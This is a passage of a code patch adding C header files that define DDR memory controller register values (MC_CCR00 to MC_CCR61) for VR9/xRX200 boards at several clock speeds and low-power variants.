+#define	MC_CCR15_VALUE	0x2000F
+#define	MC_CCR16_VALUE	0x30000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x3020002
+#define	MC_CCR19_VALUE	0x10102
+#define	MC_CCR20_VALUE	0x5000000
+#define	MC_CCR21_VALUE	0x30A0200
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0x8020000
+#define	MC_CCR24_VALUE	0xD03
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x320000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x510
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x430000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0xF2D93
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x8235
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x212004
+#define	MC_CCR40_VALUE	0x212304
+#define	MC_CCR41_VALUE	0x210004
+#define	MC_CCR42_VALUE	0x210004
+#define	MC_CCR43_VALUE	0x666304
+#define	MC_CCR44_VALUE	0x666304
+#define	MC_CCR45_VALUE	0x660004
+#define	MC_CCR46_VALUE	0x660004
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr1/xrx200_ddr1_200M_lp_settings.h b/board/vr9/ddr1/xrx200_ddr1_200M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr1/xrx200_ddr1_200M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000001
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x3000301
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x5060A0F
+#define	MC_CCR15_VALUE	0x2000F
+#define	MC_CCR16_VALUE	0x30000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x16010102
+#define	MC_CCR20_VALUE	0x7000014
+#define	MC_CCR21_VALUE	0x40D0200
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xA020000
+#define	MC_CCR24_VALUE	0x1004
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x320000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x613
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x510080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1236B1
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x9C41
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x212004
+#define	MC_CCR40_VALUE	0x212304
+#define	MC_CCR41_VALUE	0x210004
+#define	MC_CCR42_VALUE	0x210004
+#define	MC_CCR43_VALUE	0x666304
+#define	MC_CCR44_VALUE	0x666304
+#define	MC_CCR45_VALUE	0x660004
+#define	MC_CCR46_VALUE	0x660004
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr1/xrx200_ddr1_200M_settings.h b/board/vr9/ddr1/xrx200_ddr1_200M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr1/xrx200_ddr1_200M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000001
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x3000301
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x5060A0F
+#define	MC_CCR15_VALUE	0x2000F
+#define	MC_CCR16_VALUE	0x30000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x10102
+#define	MC_CCR20_VALUE	0x7000000
+#define	MC_CCR21_VALUE	0x40D0200
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xA020000
+#define	MC_CCR24_VALUE	0x1004
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x320000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x613
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x510000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1236B1
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x9C41
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x212004
+#define	MC_CCR40_VALUE	0x212304
+#define	MC_CCR41_VALUE	0x210004
+#define	MC_CCR42_VALUE	0x210004
+#define	MC_CCR43_VALUE	0x666304
+#define	MC_CCR44_VALUE	0x666304
+#define	MC_CCR45_VALUE	0x660004
+#define	MC_CCR46_VALUE	0x660004
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/evm_dual_ddr_xrx200_ddr2_250M_settings.h b/board/vr9/ddr2/evm_dual_ddr_xrx200_ddr2_250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/vr9/ddr2/evm_dual_ddr_xrx200_ddr2_250M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+		
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000100
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x3000101
+#define	MC_CCR09_VALUE	0x2000000
+#define	MC_CCR10_VALUE	0x2020101
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x70102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x30302
+#define	MC_CCR20_VALUE	0x8000700
+#define	MC_CCR21_VALUE	0x40F020A
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xC020000
+#define	MC_CCR24_VALUE	0x4403104
+#define	MC_CCR25_VALUE	0x440
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x642
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x798
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x650000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x34445D
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0xC351
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x141F04
+#define	MC_CCR40_VALUE	0x142704
+#define	MC_CCR41_VALUE	0x141b42
+#define	MC_CCR42_VALUE	0x141b42
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x1133
+#define	MC_CCR53_VALUE	0xF3014B27
+#define	MC_CCR54_VALUE	0xF3014B27
+#define	MC_CCR55_VALUE	0xF3014B27
+#define	MC_CCR56_VALUE	0xF3014B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr1_167M_lp_settings.h b/board/vr9/ddr2/xrx200_ddr1_167M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr1_167M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000001
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x3000301
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x5060A0F
+#define	MC_CCR15_VALUE	0x2000F
+#define	MC_CCR16_VALUE	0x30000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x3020002
+#define	MC_CCR19_VALUE	0x16010102
+#define	MC_CCR20_VALUE	0x6000014 
+#define	MC_CCR21_VALUE	0x30B0200
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0x8020000
+#define	MC_CCR24_VALUE	0xD03
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x320000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x512
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x430080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0xF2DAB
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x8279
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x212004
+#define	MC_CCR40_VALUE	0x212304
+#define	MC_CCR41_VALUE	0x210004
+#define	MC_CCR42_VALUE	0x210004
+#define	MC_CCR43_VALUE	0x666304
+#define	MC_CCR44_VALUE	0x666304
+#define	MC_CCR45_VALUE	0x660004
+#define	MC_CCR46_VALUE	0x660004
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7C00301
+#define	MC_CCR58_VALUE	0x7C00301
+#define	MC_CCR59_VALUE	0x7C00301
+#define	MC_CCR60_VALUE	0x7C00301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_167M_lp_settings.h b/board/vr9/ddr2/xrx200_ddr2_167M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_167M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x3020002
+#define	MC_CCR19_VALUE	0x16030302
+#define	MC_CCR20_VALUE	0x5000714
+#define	MC_CCR21_VALUE	0x30A0207
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0x8020000
+#define	MC_CCR24_VALUE	0x4401203
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x4420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x510
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x430080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x142D93
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x8235
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x1F1F04
+#define	MC_CCR40_VALUE	0x1F2704
+#define	MC_CCR41_VALUE	0x1F1C66
+#define	MC_CCR42_VALUE	0x1F1C66
+#define	MC_CCR43_VALUE	0x666504
+#define	MC_CCR44_VALUE	0x666504
+#define	MC_CCR45_VALUE	0x665F1B
+#define	MC_CCR46_VALUE	0x665F1B
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_167M_settings.h b/board/vr9/ddr2/xrx200_ddr2_167M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_167M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x3020002
+#define	MC_CCR19_VALUE	0x30302
+#define	MC_CCR20_VALUE	0x5000700
+#define	MC_CCR21_VALUE	0x30A0207
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0x8020000
+#define	MC_CCR24_VALUE	0x4401203
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x4420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x510
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x430000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x142D93
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x8235
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x1F1F04
+#define	MC_CCR40_VALUE	0x1F2704
+#define	MC_CCR41_VALUE	0x1F1C66
+#define	MC_CCR42_VALUE	0x1F1C66
+#define	MC_CCR43_VALUE	0x666504
+#define	MC_CCR44_VALUE	0x666504
+#define	MC_CCR45_VALUE	0x665F1B
+#define	MC_CCR46_VALUE	0x665F1B
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_200M_128M_settings.h b/board/vr9/ddr2/xrx200_ddr2_200M_128M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_200M_128M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x101
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x30302
+#define	MC_CCR20_VALUE	0x7000700
+#define	MC_CCR21_VALUE	0x40C0208
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xA020000
+#define	MC_CCR24_VALUE	0x4401604
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x613
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x510000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1836B1
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x9C41
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x1A1F04
+#define	MC_CCR40_VALUE	0x1A2704
+#define	MC_CCR41_VALUE	0x1A1C57
+#define	MC_CCR42_VALUE	0x1A1C57
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3004B27
+#define	MC_CCR54_VALUE	0xF3004B27
+#define	MC_CCR55_VALUE	0xF3004B27
+#define	MC_CCR56_VALUE	0xF3004B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_200M_lp_settings.h b/board/vr9/ddr2/xrx200_ddr2_200M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_200M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x16030302
+#define	MC_CCR20_VALUE	0x7000714
+#define	MC_CCR21_VALUE	0x40C0208
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xA020000
+#define	MC_CCR24_VALUE	0x4401604
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x613
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x510080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1836B1
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x9C41
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x1A1F04
+#define	MC_CCR40_VALUE	0x1A2704
+#define	MC_CCR41_VALUE	0x1A1C57
+#define	MC_CCR42_VALUE	0x1A1C57
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B27
+#define	MC_CCR54_VALUE	0xF3014B27
+#define	MC_CCR55_VALUE	0xF3014B27
+#define	MC_CCR56_VALUE	0xF3014B27
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr2/xrx200_ddr2_200M_settings.h b/board/vr9/ddr2/xrx200_ddr2_200M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr2/xrx200_ddr2_200M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000101
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x2000401
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x7080A0F
+#define	MC_CCR15_VALUE	0x2040F
+#define	MC_CCR16_VALUE	0x40000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x4020002
+#define	MC_CCR19_VALUE	0x30302
+#define	MC_CCR20_VALUE	0x7000700
+#define	MC_CCR21_VALUE	0x40C0208
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0xA020000
+#define	MC_CCR24_VALUE	0x4401604
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x6420000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x613
+#define	MC_CCR31_VALUE	0x0
+#define	MC_CCR32_VALUE	0x0
+#define	MC_CCR33_VALUE	0x510000
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0x1836B1
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x9C41
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x1A1F04
+#define	MC_CCR40_VALUE	0x1A2704
+#define	MC_CCR41_VALUE	0x1A1C57
+#define	MC_CCR42_VALUE	0x1A1C57
+#define	MC_CCR43_VALUE	0x566504
+#define	MC_CCR44_VALUE	0x566504
+#define	MC_CCR45_VALUE	0x565F17
+#define	MC_CCR46_VALUE	0x565F17
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3004B27
+#define	MC_CCR54_VALUE	0xF3004B27
+#define	MC_CCR55_VALUE	0xF3004B27
+#define	MC_CCR56_VALUE	0xF3004B27
